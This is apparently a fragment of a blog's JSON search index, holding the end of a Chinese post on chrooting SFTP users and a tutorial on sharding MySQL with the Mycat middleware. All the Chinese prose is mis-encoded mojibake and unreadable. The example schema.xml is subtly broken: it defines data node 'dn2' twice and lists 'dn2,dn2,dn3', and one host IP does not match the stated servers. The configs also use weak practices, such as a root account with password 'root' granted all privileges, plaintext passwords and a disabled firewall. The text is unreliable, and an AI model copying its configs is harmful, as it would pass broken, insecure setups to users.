ä¸Šï¼Œå¦åˆ™åˆ æ‰ AllowTcpForwarding no X11Forwarding no æˆ–è€…å¯¹userç”¨æˆ·æƒé™é…ç½® 12345678#åŒ¹é… user ç”¨æˆ·Match User user #ChrootDirectory %u (%uä»£è¡¨å˜é‡ç”¨æˆ·å) ChrootDirectory /data/test ForceCommand internal-sftp AllowTcpForwarding no PermitTunnel no X11Forwarding no ä¿®æ”¹é”å®šç”¨æˆ·ç›®å½•çš„æƒé™1234#æ‰€æœ‰è€…è®¾ç½®ä¸ºäº†rootï¼Œæ‰€æœ‰ç»„è®¾ç½®ä¸ºsftpchown root:sftp /data/test#æƒé™è®¾ç½®ä¸º755ï¼Œæ‰€æœ‰è€…rootæœ‰å†™å…¥æƒé™ï¼Œè€Œæ‰€æœ‰ç»„sftpæ— å†™å…¥æƒé™chmod -R 755 /data/test ç›®å½•çš„æƒé™è®¾å®šæœ‰ä¸¤ä¸ªè¦ç‚¹ï¼š1ã€ç”±ChrootDirectoryæŒ‡å®šçš„ç›®å½•å¼€å§‹ä¸€ç›´å¾€ä¸Šåˆ°ç³»ç»Ÿæ ¹ç›®å½•ä¸ºæ­¢çš„ç›®å½•æ‹¥æœ‰è€…éƒ½åªèƒ½æ˜¯root2ã€ç”±ChrootDirectoryæŒ‡å®šçš„ç›®å½•å¼€å§‹ä¸€ç›´å¾€ä¸Šåˆ°ç³»ç»Ÿæ ¹ç›®å½•ä¸ºæ­¢éƒ½ä¸å¯ä»¥å…·æœ‰ç¾¤ç»„å†™å…¥æƒé™ï¼ˆæœ€å¤§æƒé™ä¸º755ï¼‰ æ·»åŠ å¯ä¸Šä¼ åˆ é™¤ç›®å½•1234mkdir /data/test/uploadchown user:sftp /data/test/upload#å…è®¸userç”¨æˆ·æœ‰è¯»å†™æƒé™ï¼Œç¾¤ç»„å¤–ç”¨æˆ·æ— å†™å…¥æƒé™chmod 755 /data/test/upload æ­¤æ—¶ç›®å½•æƒé™ç»“æ„drwxr-xr-x 19 root sftp 4096 9æœˆ 4 17:52 /data/testtestç›®å½•ä¸‹ï¼Œuserç”¨æˆ·å¯è¯»ä¸å¯å†™drwxr-xr-x 4 user sftp 4096 9æœˆ 28 12:02 /data/test/uploaduploadç›®å½•ä¸‹ï¼Œuserç”¨æˆ·å¯è¿›è¡Œè¯»å†™æ“ä½œ 12#é‡å¯SSHDä½¿é…ç½®ç”Ÿæ•ˆservice sshd restart 0x02 ä½¿ç”¨xftpæµ‹è¯•è¿æ¥","raw":null,"content":null,"categories":[{"name":"SSH","slug":"SSH","permalink":"https://kionf.com/categories/SSH/"},{"name":"sftp","slug":"SSH/sftp","permalink":"https://kionf.com/categories/SSH/sftp/"}],"tags":[{"name":"sftp","slug":"sftp","permalink":"https://kionf.com/tags/sftp/"}]},{"title":"Mycatåˆ†åº“åˆ†è¡¨","slug":"mysql-mycat","date":"2017-05-06T16:00:00.000Z","updated":"2018-10-31T10:19:28.311Z","comments":true,"path":"2017/05/07/mysql-mycat/","link":"","permalink":"https://kionf.com/2017/05/07/mysql-mycat/","excerpt":"0x00 æ•°æ®åˆ‡åˆ†   ç®€å•æ¥è¯´ï¼Œå°±æ˜¯æŒ‡é€šè¿‡æŸç§ç‰¹å®šçš„æ¡ä»¶ï¼Œå°†æˆ‘ä»¬å­˜æ”¾åœ¨åŒä¸€ä¸ªæ•°æ®åº“ä¸­çš„æ•°æ®åˆ†æ•£å­˜æ”¾åˆ°å¤šä¸ªæ•°æ®åº“ï¼ˆä¸»æœºï¼‰ä¸Šé¢ï¼Œä»¥è¾¾åˆ°åˆ†æ•£å•å°è®¾å¤‡è´Ÿè½½çš„æ•ˆæœï¼Œå³åˆ†åº“åˆ†è¡¨ã€‚\n","text":"0x00 æ•°æ®åˆ‡åˆ† ç®€å•æ¥è¯´ï¼Œå°±æ˜¯æŒ‡é€šè¿‡æŸç§ç‰¹å®šçš„æ¡ä»¶ï¼Œå°†æˆ‘ä»¬å­˜æ”¾åœ¨åŒä¸€ä¸ªæ•°æ®åº“ä¸­çš„æ•°æ®åˆ†æ•£å­˜æ”¾åˆ°å¤šä¸ªæ•°æ®åº“ï¼ˆä¸»æœºï¼‰ä¸Šé¢ï¼Œä»¥è¾¾åˆ°åˆ†æ•£å•å°è®¾å¤‡è´Ÿè½½çš„æ•ˆæœï¼Œå³åˆ†åº“åˆ†è¡¨ã€‚ æ•°æ®çš„åˆ‡åˆ†æ ¹æ®å…¶åˆ‡åˆ†è§„åˆ™çš„ç±»å‹ï¼Œå¯ä»¥åˆ†ä¸ºä¸¤ç§åˆ‡åˆ†æ¨¡å¼ï¼š 123å‚ç›´ï¼ˆçºµå‘ï¼‰åˆ‡åˆ†ï¼š æŒ‰ç…§ä¸åŒçš„è¡¨ï¼ˆæˆ–è€…Schemaï¼‰æ¥åˆ‡åˆ†åˆ°ä¸åŒçš„æ•°æ®åº“ï¼ˆä¸»æœºï¼‰ä¹‹ä¸Šï¼›æ°´å¹³ï¼ˆæ¨ªå‘ï¼‰åˆ‡åˆ†ï¼š æ ¹æ®è¡¨ä¸­çš„æ•°æ®çš„é€»è¾‘å…³ç³»ï¼Œå°†åŒä¸€ä¸ªè¡¨ä¸­çš„æ•°æ®æŒ‰ç…§æŸç§æ¡ä»¶æ‹†åˆ†åˆ°å¤šå°æ•°æ®åº“ï¼ˆä¸»æœºï¼‰ä¸Šé¢ã€‚ 1. å‚ç›´åˆ‡åˆ† ä¸€ä¸ªæ•°æ®åº“ç”±å¤šä¸ªè¡¨æ„æˆï¼Œæ¯ä¸ªè¡¨å¯¹åº”ç€ä¸åŒçš„ä¸šåŠ¡ï¼Œå‚ç›´åˆ‡åˆ†æ˜¯æŒ‡æŒ‰ç…§ä¸šåŠ¡å°†è¡¨è¿›è¡Œåˆ†ç±»ï¼Œåˆ†å¸ƒåˆ°ä¸åŒçš„æ•°æ®åº“ä¸Šé¢ï¼Œè¿™æ ·ä¹Ÿå°±å°†æ•°æ®æˆ–è€…è¯´å‹åŠ›åˆ†æ‹…åˆ°ä¸åŒçš„åº“ä¸Šé¢ï¼ˆä¸“åº“ä¸“ç”¨ï¼‰ã€‚ä¾‹ï¼š 12345#æœ‰å¦‚ä¸‹å‡ å¼ è¡¨--------------+--------------+------------------ç”¨æˆ·ä¿¡æ¯(user)+ äº¤æ˜“è®°å½•(pay)+ å•†å“(commodity)|--------------+--------------+------------------ å‚ç›´åˆ‡åˆ†æ ¹æ®æ¯ä¸ªè¡¨çš„ä¸åŒä¸šåŠ¡è¿›è¡Œåˆ‡å‰²ï¼Œuserè¡¨ï¼Œpayè¡¨ï¼Œcommodityè¡¨ï¼Œæ¯ä¸ªè¡¨åˆ‡åˆ†åˆ°ä¸åŒçš„æ•°æ®åº“ä¸Šã€‚ ä¼˜ç‚¹ï¼š æ‹†åˆ†åä¸šåŠ¡æ¸…æ™°ï¼Œæ‹†åˆ†è§„åˆ™æ˜ç¡®ã€‚ ç³»ç»Ÿä¹‹é—´æ•´åˆæˆ–æ‰©å±•å®¹æ˜“ã€‚ æ•°æ®ç»´æŠ¤ç®€å•ã€‚ ç¼ºç‚¹ï¼š éƒ¨åˆ†ä¸šåŠ¡è¡¨æ— æ³• joinï¼Œåªèƒ½é€šè¿‡æ¥å£æ–¹å¼è§£å†³ï¼Œæé«˜äº†ç³»ç»Ÿå¤æ‚åº¦ã€‚ å—æ¯ç§ä¸šåŠ¡ä¸åŒçš„é™åˆ¶å­˜åœ¨å•åº“æ€§èƒ½ç“¶é¢ˆï¼Œä¸æ˜“æ•°æ®æ‰©å±•è·Ÿæ€§èƒ½æé«˜ã€‚ äº‹åŠ¡å¤„ç†å¤æ‚ã€‚ 2. æ°´å¹³åˆ‡åˆ† ç›¸å¯¹äºå‚ç›´æ‹†åˆ†ï¼Œæ°´å¹³æ‹†åˆ†ä¸æ˜¯å°†è¡¨åšåˆ†ç±»ï¼Œè€Œæ˜¯æŒ‰ç…§æŸä¸ªå­—æ®µçš„æŸç§è§„åˆ™æ¥åˆ†æ•£åˆ°å¤šä¸ªåº“ä¹‹ä¸­ï¼Œæ¯ä¸ªè¡¨ä¸­åŒ…å«ä¸€éƒ¨åˆ†æ•°æ®ã€‚ç®€å•æ¥è¯´ï¼Œæˆ‘ä»¬å¯ä»¥å°†æ•°æ®çš„æ°´å¹³åˆ‡åˆ†ç†è§£ä¸ºæ˜¯æŒ‰ç…§æ•°æ®è¡Œçš„åˆ‡åˆ†ï¼Œå°±æ˜¯å°†è¡¨ä¸­çš„æŸäº›è¡Œåˆ‡åˆ†åˆ°ä¸€ä¸ªæ•°æ®åº“ï¼Œè€Œå¦å¤–çš„æŸäº›è¡Œåˆåˆ‡åˆ†åˆ°å…¶ä»–çš„æ•°æ®åº“ä¸­ï¼Œå¦‚å›¾ï¼š ä¼˜ç‚¹ï¼š æ‹†åˆ†è§„åˆ™æŠ½è±¡å¥½ï¼Œjoin æ“ä½œåŸºæœ¬å¯ä»¥æ•°æ®åº“åšã€‚ ä¸å­˜åœ¨å•åº“å¤§æ•°æ®ï¼Œé«˜å¹¶å‘çš„æ€§èƒ½ç“¶é¢ˆã€‚ åº”ç”¨ç«¯æ”¹é€ è¾ƒå°‘ã€‚ æé«˜äº†ç³»ç»Ÿçš„ç¨³å®šæ€§è·Ÿè´Ÿè½½èƒ½åŠ›ã€‚ ç¼ºç‚¹ï¼š æ‹†åˆ†è§„åˆ™éš¾ä»¥æŠ½è±¡ã€‚ åˆ†ç‰‡äº‹åŠ¡ä¸€è‡´æ€§éš¾ä»¥è§£å†³ã€‚ æ•°æ®å¤šæ¬¡æ‰©å±•éš¾åº¦è·Ÿç»´æŠ¤é‡æå¤§ã€‚ è·¨åº“ join æ€§èƒ½è¾ƒå·®ã€‚ å…±åŒç‰¹ç‚¹ç¼ºç‚¹ å¼•å…¥åˆ†å¸ƒå¼äº‹åŠ¡çš„é—®é¢˜ è·¨èŠ‚ç‚¹ Join çš„é—®é¢˜ è·¨èŠ‚ç‚¹åˆå¹¶æ’åºåˆ†é¡µé—®é¢˜ å¤šæ•°æ®æºç®¡ç†é—®é¢˜ ä»‹ç»å®Œä¸¤ç§åˆ‡åˆ†æ–¹å¼ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ ¹æ®è‡ªå·±çš„ä¸šåŠ¡éœ€æ±‚æ¥é€‰æ‹©ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬é€šè¿‡ä¸­é—´ä»¶æ¥è¿›è¡Œæ•°æ®çš„åˆ‡åˆ† 0x01 åˆ†åº“åˆ†è¡¨ä¸­é—´ä»¶MycatMycatå®ƒæ˜¯ä¸€ä¸ªå¼€æºçš„åˆ†å¸ƒå¼æ•°æ®åº“ç³»ç»Ÿï¼Œ å¼ºå¤§çš„æ•°æ®åº“ä¸­é—´ä»¶ï¼Œå®ç°äº† MySQL åè®®çš„çš„Server,å‰ç«¯ç”¨æˆ·å¯ä»¥æŠŠå®ƒçœ‹ä½œæ˜¯ä¸€ä¸ªæ•°æ®åº“ä»£ç†ï¼Œç”¨ MySQL å®¢æˆ·ç«¯å·¥å…·å’Œå‘½ä»¤è¡Œè®¿é—®ï¼Œè€Œå…¶åç«¯å¯ä»¥ç”¨MySQL åŸç”Ÿï¼ˆNativeï¼‰åè®®ä¸å¤šä¸ª MySQL æœåŠ¡å™¨é€šä¿¡ï¼Œä¹Ÿå¯ä»¥ç”¨ JDBC åè®®ä¸å¤§å¤šæ•°ä¸»æµæ•°æ®åº“æœåŠ¡å™¨é€šä¿¡ï¼Œå…¶æ ¸å¿ƒåŠŸèƒ½æ˜¯åˆ†è¡¨åˆ†åº“ï¼Œå³å°†ä¸€ä¸ªå¤§è¡¨æ°´å¹³åˆ†å‰²ä¸º N ä¸ªå°è¡¨ï¼Œå­˜å‚¨åœ¨åç«¯ MySQL æœåŠ¡å™¨é‡Œæˆ–è€…å…¶ä»–æ•°æ®åº“é‡Œã€‚ å®éªŒæœºå™¨ç¯å¢ƒï¼šCentOS6.8(2å°), JDK8, Mycat1.6, MySql5.1.73 12server1 192.168.1.214 mysqlserver2 192.168.1.216 mycat JDK 1. å®‰è£…MycatMycatä¾èµ–javaç¯å¢ƒï¼Œæ‰€ä»¥è¦å®‰è£…jdkï¼Œè¿™é‡Œç›´æ¥ä½¿ç”¨yum -y install java å®‰è£…javaç¯å¢ƒ å¦‚æœéœ€è¦jps, jmapç­‰å‘½ä»¤åˆ™æ‰§è¡Œyum -y install java-devel ä¸‹è½½Mycat 1234567#æ‰§è¡Œåœ¨server2mkdir -p /usr/local/mycat &amp;&amp; cd /usr/local/mycatwget -c -t5 -O Mycat-1.6.tar.gz \"http://dl.mycat.io/1.6-RELEASE/Mycat-server-1.6-RELEASE-20161028204710-linux.tar.gz\"tar xvf Mycat-1.6.tar.gz -C ./ æˆ‘ä»¬æ¥å¤§æ¦‚çœ‹ä¸€ä¸‹Mycatçš„ç›®å½•ç»“æ„ï¼š 123456789101112131415.â”œâ”€â”€ binâ”‚ â”œâ”€â”€ mycat Mycatå¯åŠ¨ç¨‹åºâ”‚ â”œâ”€â”€ ...â”œâ”€â”€ catletâ”œâ”€â”€ conf â”‚ â”œâ”€â”€ log4j2.xml æ—¥å¿—çš„é…ç½® æ ¹æ®è‡ªå·±çš„éœ€è¦å¯ä»¥è°ƒæ•´è¾“å‡ºçº§åˆ«ä¸ºdebugâ”‚ â”œâ”€â”€ rule.xml åˆ†ç‰‡è§„åˆ™çš„é…ç½®æ–‡ä»¶ï¼Œåˆ†ç‰‡è§„åˆ™çš„å…·ä½“å‚æ•°ä¿¡æ¯å•ç‹¬å­˜æ”¾ä¸ºæ–‡ä»¶ï¼Œä¹Ÿåœ¨å½“å‰ç›®å½•ï¼Œé…ç½®æ–‡ä»¶ä¿®æ”¹éœ€è¦é‡å¯MyCATã€‚â”‚ â”œâ”€â”€ schema.xml é€»è¾‘åº“å®šä¹‰å’Œè¡¨ä»¥åŠåˆ†ç‰‡å®šä¹‰çš„é…ç½®æ–‡ä»¶ã€‚â”‚ â”œâ”€â”€ server.xml MycatæœåŠ¡å™¨å‚æ•°è°ƒæ•´å’Œç”¨æˆ·æˆæƒçš„é…ç½®æ–‡ä»¶ã€‚â”‚ â”œâ”€â”€ wrapper.conf JVMå†…å­˜é…ç½®æ–‡ä»¶â”‚ â”œâ”€â”€ zkconf Zookeeperé…ç½®ç›®å½•â”œâ”€â”€ lib MyCATè‡ªèº«çš„jaråŒ…æˆ–ä¾èµ–çš„jaråŒ…çš„å­˜æ”¾ç›®å½•ã€‚â”œâ”€â”€ logs MyCATæ—¥å¿—çš„å­˜æ”¾ç›®å½•ã€‚æ—¥å¿—å­˜æ”¾åœ¨logs/logä¸­ï¼Œæ¯å¤©ä¸€ä¸ªæ–‡ä»¶ã€‚â””â”€â”€ version.txt ç‰ˆæœ¬ä¿¡æ¯ 2. é…ç½®é…ç½®MycatæœåŠ¡å™¨å‚æ•°ç¼–è¾‘MycatæœåŠ¡å™¨å‚æ•°è°ƒæ•´å’Œç”¨æˆ·æˆæƒçš„é…ç½®æ–‡ä»¶vim conf/server.xml(é…ç½®æ–‡ä»¶ä¸­æœ‰æ³¨é‡Š)é¦–å…ˆå¤‡ä»½ä¸€ä»½ï¼Œcp conf/server.xml conf/server.xml.bakè·³è½¬åˆ°æ–‡ä»¶å°¾éƒ¨ç¼–è¾‘å¦‚ä¸‹ 12345678910111213141516171819202122232425262728293031323334&lt;!--æ­¤å¤„å®šä¹‰çš„ç”¨æˆ·ï¼Œä¸ºClientè¿æ¥Mycatçš„ç”¨æˆ·å¯†ç ï¼Œå¯ä»¥é…ç½®ç›¸å…³æ•°æ®åº“åŠè¡¨è¯»å†™çš„æƒé™ï¼Œ--&gt; &lt;user name=\"root\"&gt; &lt;property name=\"password\"&gt;test&lt;/property&gt; &lt;property name=\"schemas\"&gt;TESTDB&lt;/property&gt; &lt;!--&lt;property name=\"readOnly\"&gt;true&lt;/property&gt;--&gt; &lt;/user&gt; &lt;!-- è¡¨çº§ DML æƒé™è®¾ç½® --&gt; &lt;!-- &lt;privileges check=\"false\"&gt; &lt;schema name=\"TESTDB\" dml=\"0110\" &gt; &lt;table name=\"tb01\" dml=\"0000\"&gt;&lt;/table&gt; &lt;table name=\"tb02\" dml=\"1111\"&gt;&lt;/table&gt; &lt;/schema&gt; &lt;/privileges&gt; --&gt;&lt;!--æ­¤å¤„å®šä¹‰è¿æ¥IPç™½åå•å’Œ SQL é»‘åå•--&gt; &lt;!-- å…¨å±€SQLé˜²ç«å¢™è®¾ç½® --&gt; &lt;!-- &lt;firewall&gt; &lt;whitehost&gt; &lt;host user=\"mycat\" host=\"127.0.0.1\"&gt;&lt;/host&gt; ip ç™½åå• ç”¨æˆ·å¯¹åº”çš„å¯ä»¥è®¿é—®çš„ ip åœ°å€ &lt;/whitehost&gt; &lt;blacklist check=\"true\"&gt; &lt;property name=\"selelctAllow\"&gt;false&lt;/property&gt; é»‘åå•å…è®¸çš„ æƒé™ åé¢ä¸ºé»˜è®¤ &lt;/blacklist&gt; &lt;/firewall&gt; --&gt;# é…ç½®é€»è¾‘åº“è¡¨ï¼Œåˆ†ç‰‡å®šä¹‰ç¼–è¾‘é€»è¾‘åº“å®šä¹‰å’Œè¡¨ä»¥åŠåˆ†ç‰‡å®šä¹‰çš„é…ç½®æ–‡ä»¶vim conf/schema.xmlåŒæ ·å…ˆå¤‡ä»½ä¸€ä»½cp conf/schema.xml conf/schema.xml.bakç¼–è¾‘ä¸ºå¦‚ä¸‹å†…å®¹ æœ‰å¦‚ä¸‹è¡¨ç»“æ„ï¼š 12345678910111213+--------------------+-------+------------------------+--------------------+| ID | LEVEL | EXTEND_ATTR | UID |+--------------------+-------+------------------------+--------------------+| 298599220716244992 | 1 | &#123;&#125; | 298321762779664384 || 298600412901019648 | 0 | &#123;&#125; | 298321762779664384 || 298682157746884608 | 3 | &#123;\"129\":2&#125; | 298667788531142656 || 298684200884637696 | 2 | &#123;&#125; | 298667788531142656 || 298685806279659520 | 2 | &#123;&#125; | 298667788531142656 || 298686594007699456 | 2 | &#123;&#125; | 298667788531142656 || 298687219567169536 | 2 | &#123;&#125; | 298667788531142656 || 298688215626289152 | 1 | &#123;&#125; | 298667788531142656 || 298689820996145152 | 1 | &#123;&#125; | 298667788531142656 |+--------------------+-------+------------------------+--------------------+ è¿™é‡Œé€‰æ‹©æ ¹æ®UIDè¿›è¡Œæ°´å¹³åˆ‡åˆ†ï¼Œé…ç½®æ–‡ä»¶å¦‚ä¸‹ï¼š 123456789101112131415161718192021222324&lt;?xml version=\"1.0\"?&gt;&lt;!DOCTYPE mycat:schema SYSTEM \"schema.dtd\"&gt;&lt;mycat:schema xmlns:mycat=\"http://io.mycat/\"&gt; &lt;!--å®šä¹‰é€»è¾‘æ•°æ®åº“TESTDBï¼Œé€»è¾‘è¡¨t_rune,ä¸»é”®ã€åˆ‡åˆ†è§„åˆ™(mod-long)ï¼Œå’Œæ•°æ®åº“èŠ‚ç‚¹(dn2,dn2,dn3)--&gt; &lt;schema name=\"TESTDB\" checkSQLschema=\"false\" sqlMaxLimit=\"100\"&gt; &lt;table name=\"t_rune\" primaryKey=\"uid\" dataNode=\"dn2,dn2,dn3\" rule=\"mod-long\" &gt; &lt;/table&gt; &lt;/schema&gt; &lt;!--å®šä¹‰æ¯ä¸ªæ•°æ®åº“èŠ‚ç‚¹ç›¸å…³ä¿¡æ¯--&gt; &lt;dataNode name=\"dn2\" dataHost=\"server1\" database=\"db1\" /&gt; &lt;dataNode name=\"dn2\" dataHost=\"server1\" database=\"db2\" /&gt; &lt;dataNode name=\"dn3\" dataHost=\"server1\" database=\"db3\" /&gt; &lt;!--ç­‰åŒäºä»¥ä¸Šé…ç½®&lt;dataNodename=â€œdn$1-3â€ dataHost=â€œserver1â€ database=â€œdb$1-3â€/&gt; --&gt; &lt;!--å®šä¹‰ä¸»æœºä¿¡æ¯ï¼ŒåŠMysqlç”¨æˆ·å¯†ç --&gt; &lt;dataHost name=\"server1\" maxCon=\"1000\" minCon=\"10\" balance=\"0\" writeType=\"0\" dbType=\"mysql\" dbDriver=\"native\" switchType=\"1\" slaveThreshold=\"100\"&gt; &lt;!--å¿ƒè·³æ£€æµ‹è¯­å¥--&gt; &lt;heartbeat&gt;select user()&lt;/heartbeat&gt; &lt;!-- è¿œç¨‹æ•°æ®åº“é…ç½®ä¿¡æ¯ --&gt; &lt;writeHost host=\"192.168.99.21\" url=\"192.168.99.214:3306\" user=\"root\" password=\"root\"&gt; &lt;/writeHost&gt; &lt;/dataHost&gt;&lt;/mycat:schema&gt; æ— è®ºåˆ†ç‰‡ä¸å¦,æ¯å¼ è¡¨éƒ½éœ€è¦å®šä¹‰, ç”Ÿäº§,ä¾‹: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263&lt;?xml version=\"1.0\"?&gt;&lt;!DOCTYPE mycat:schema SYSTEM \"schema.dtd\"&gt;&lt;mycat:schema xmlns:mycat=\"http://io.mycat/\"&gt; &lt;schema name=\"bigduck\" checkSQLschema=\"true\" sqlMaxLimit=\"100\"&gt; &lt;!--åˆ†--&gt; &lt;!--t_shop_visible--&gt; &lt;table name=\"t_shop_visible\" primaryKey=\"ID\" dataNode=\"dn$1-15\" rule=\"mod-long\"&gt; &lt;/table&gt; &lt;!--t_friendlog--&gt; &lt;table name=\"t_friendlog\" primaryKey=\"ID\" dataNode=\"dn$1-15\" rule=\"mod-long\"&gt; &lt;/table&gt; &lt;!--t_room--&gt; &lt;table name=\"t_room\" primaryKey=\"ID\" dataNode=\"dn$1-15\" rule=\"mod-long\"&gt; &lt;/table&gt; &lt;!--t_npc--&gt; &lt;table name=\"t_npc\" primaryKey=\"ID\" dataNode=\"dn$1-15\" rule=\"mod-long\"&gt; &lt;/table&gt; &lt;!--t_arena_fight--&gt; &lt;table name=\"t_arena_fight\" primaryKey=\"ID\" dataNode=\"dn$1-15\" rule=\"mod-long\"&gt; &lt;/table&gt; &lt;!--ä¸åˆ†--&gt; &lt;!--alliance_id--&gt; &lt;table name=\"alliance_id\" primaryKey=\"seq_id\" dataNode=\"dn2\"&gt; &lt;/table&gt; &lt;!--t_alliance_boss--&gt; &lt;table name=\"t_alliance_boss\" primaryKey=\"ALLIANCEID\" dataNode=\"dn2\"&gt; &lt;/table&gt; &lt;!--t_alliance_boss_id--&gt; &lt;table name=\"t_alliance_boss_id\" primaryKey=\"ALLIANCEID\" dataNode=\"dn2\"&gt; &lt;/table&gt; &lt;!--t_alliance_boss_log--&gt; &lt;table name=\"t_alliance_boss_log\" primaryKey=\"ID\" dataNode=\"dn2\"&gt; &lt;/table&gt; &lt;!--t_alliance_member_boss--&gt; &lt;table name=\"t_alliance_member_boss\" primaryKey=\"UID\" dataNode=\"dn2\"&gt; &lt;/table&gt; &lt;!-- global table is auto cloned to all defined data nodes ,so can join with any table whose sharding node is in the same data node --&gt; &lt;!--å…¨å±€è¡¨--&gt; &lt;!--t_arena--&gt; &lt;table name=\"t_arena\" primaryKey=\"UID\" type=\"global\" dataNode=\"dn2\"&gt; &lt;/table&gt; &lt;/schema&gt; &lt;dataNode name=\"dn$1-5\" dataHost=\"mysql-server-01\" database=\"db$11-15\" /&gt; &lt;dataNode name=\"dn$6-10\" dataHost=\"mysql-server-02\" database=\"db$21-25\" /&gt; &lt;dataNode name=\"dn$11-15\" dataHost=\"mysql-server-03\" database=\"db$31-35\" /&gt; &lt;dataHost name=\"mysql-server-01\" maxCon=\"2000\" minCon=\"100\" balance=\"0\" dbType=\"mysql\" dbDriver=\"native\"&gt; &lt;heartbeat&gt;select user()&lt;/heartbeat&gt; &lt;writeHost host=\"172.17.0.2\" url=\"172.17.0.2:3306\" user=\"root\" password=\"pa33w0rd\"&gt; &lt;/writeHost&gt; &lt;/dataHost&gt; &lt;dataHost name=\"mysql-server-02\" maxCon=\"2000\" minCon=\"100\" balance=\"0\" dbType=\"mysql\" dbDriver=\"native\"&gt; &lt;heartbeat&gt;select user()&lt;/heartbeat&gt; &lt;writeHost host=\"172.17.0.3\" url=\"172.17.0.3:3306\" user=\"root\" password=\"pa33w0rd\"&gt; &lt;/writeHost&gt; &lt;/dataHost&gt; &lt;dataHost name=\"mysql-server-03\" maxCon=\"2000\" minCon=\"100\" balance=\"0\" dbType=\"mysql\" dbDriver=\"native\"&gt; &lt;heartbeat&gt;select user()&lt;/heartbeat&gt; &lt;writeHost host=\"172.17.0.4\" url=\"172.17.0.4:3306\" user=\"root\" password=\"pa33w0rd\"&gt; &lt;/writeHost&gt; &lt;/dataHost&gt;&lt;/mycat:schema&gt; é…ç½®åˆ‡ç‰‡è§„åˆ™åœ¨ä¸Šæ­¥çš„schema.xmlæ–‡ä»¶ä¸­å®šä¹‰äº†åˆ†ç‰‡è§„åˆ™ï¼šrule=&quot;mod-long&quot;æ­¤æ—¶ç¼–è¾‘conf/rule.xmlæ–‡ä»¶æ·»åŠ åˆ†ç‰‡è§„åˆ™çš„å…·ä½“å‚æ•°ä¿¡æ¯ 123456789101112131415161718192021222324252627 &lt;tableRule name=\"mod-long\"&gt; &lt;rule&gt; &lt;columns&gt;uid&lt;/columns&gt; &lt;algorithm&gt;mod-long&lt;/algorithm&gt; &lt;/rule&gt; &lt;/tableRule&gt;&lt;!-- name å±æ€§æŒ‡å®šå”¯ä¸€çš„åå­—ï¼Œç”¨äºæ ‡è¯†ä¸åŒçš„è¡¨è§„åˆ™ã€‚ å†…åµŒçš„ rule æ ‡ç­¾åˆ™æŒ‡å®šå¯¹ç‰©ç†è¡¨ä¸­çš„å“ªä¸€åˆ—è¿›è¡Œæ‹†åˆ†å’Œä½¿ç”¨ä»€ä¹ˆè·¯ç”±ç®—æ³•ã€‚ columns å†…æŒ‡å®šè¦æ‹†åˆ†çš„åˆ—åå­—ã€‚ algorithm ä½¿ç”¨ function æ ‡ç­¾ä¸­çš„ name å±æ€§ã€‚è¿æ¥è¡¨è§„åˆ™å’Œå…·ä½“è·¯ç”±ç®—æ³•ã€‚å½“ç„¶ï¼Œå¤šä¸ªè¡¨è§„åˆ™å¯ä»¥è¿æ¥åˆ° åŒä¸€ä¸ªè·¯ç”±ç®—æ³•ä¸Šã€‚table æ ‡ç­¾å†…ä½¿ç”¨ã€‚è®©é€»è¾‘è¡¨ä½¿ç”¨è¿™ä¸ªè§„åˆ™è¿›è¡Œåˆ†ç‰‡ã€‚--&gt; &lt;function name=\"mod-long\" class=\"io.mycat.route.function.PartitionByMod\"&gt; &lt;!--æ³¨æ„ï¼è¿™é‡Œå¡«å†™æ•°æ®åº“èŠ‚ç‚¹æ•°ï¼Œå¦åˆ™æ— æ³•åˆ†ç‰‡--&gt; &lt;property name=\"count\"&gt;3&lt;/property&gt; &lt;/function&gt;&lt;!-- name æŒ‡å®šç®—æ³•çš„åå­—ã€‚ class åˆ¶å®šè·¯ç”±ç®—æ³•å…·ä½“çš„ç±»åå­—ã€‚ï¼ˆæ­¤å¤„ä½¿ç”¨æ±‚æ¨¡æ³•ï¼‰ property ä¸ºå…·ä½“ç®—æ³•éœ€è¦ç”¨åˆ°çš„ä¸€äº›å±æ€§ã€‚--&gt; å…·ä½“åˆ‡ç‰‡ç®—æ³•è§„åˆ™ï¼šMycatåˆ‡ç‰‡ç®—æ³•è§„åˆ™è¯¦è§£ 0x02 é…ç½®æ•°æ®åº“èŠ‚ç‚¹é…ç½®server1æ•°æ®åº“ï¼Œç”¨æˆ·å¯†ç ä¸ºschema.xmlæ–‡ä»¶ä¸­é…ç½®ç›¸åŒï¼Œå¹¶å…è®¸server2è¿ç¨‹è¿æ¥ 12grant all privileges on *.* to 'root'@'192.168.99.216' identified by 'root' with grant option;flush privileges; åˆ›å»ºé…ç½®æ–‡ä»¶ä¸­æ•°æ®åº“èŠ‚ç‚¹db1,db2.db3 123create database db1 character set utf8;create database db2 character set utf8;create database db3 character set utf8; æµ‹è¯•ç¯å¢ƒä¸­ç¡®è®¤2å°æœºå™¨é˜²ç«å¢™å…³é—­server iptables stop è¿”å›åˆ°server1å¯åŠ¨Mycat 1234567891011121314cd /usr/local/mycat./bin/mycat start[root@Centos6-8-TestEnv mycat]# netstat -ntlpActive Internet connections (only servers)Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 127.0.0.1:32000 0.0.0.0:* LISTEN 8613/java tcp 0 0 :::1984 :::* LISTEN 8613/java tcp 0 0 :::8066 :::* LISTEN 8613/java#ç¡®ä¿8066ç«¯å£ç›‘å¬æ­¤ä¸ºMycatæœåŠ¡å™¨é»˜è®¤ç«¯å£ tcp 0 0 :::60743 :::* LISTEN 8613/java tcp 0 0 :::43303 :::* LISTEN 8613/java tcp 0 0 :::9066 :::* LISTEN 8613/java 0x03 æ•°æ®è¿ç§»ç¼–è¾‘/etc/my.cnfæ·»åŠ 1234[mysqldump]max_allowed_packet = 16M#default-character-set = utf8mb4 mysqldumpå¯¼å…¥æŠ¥ERROR 1153 (08S01) at line 1133809: Got a packet bigger than &#39;max_allowed_packet&#39; bytesé”™è¯¯ï¼Œå› ä¸ºMySQLå…è®¸çš„é»˜è®¤å¤§å°ä¸º1MBã€‚ æ³¨æ„ï¼ŒMycatåœ¨æ‰§è¡ŒINSERTè¯­å¥æ—¶éœ€è¦å®Œæ•´INSERTè¯­å¥(ç”¨åˆ—å) 123456mysqldump -uroot -p -c --skip-add-locks --skip-extended-insert --no-autocommit databaseName &gt; databaseName.sql# -c å‚æ•°ä¸å¯å°‘ï¼Œ-c, å…¨ç§°ä¸ºâ€“complete-insert è¡¨ç¤ºä½¿ç”¨å®Œæ•´çš„ insert è¯­å¥(ç”¨åˆ—åå­—)ã€‚# --skip-add-locks 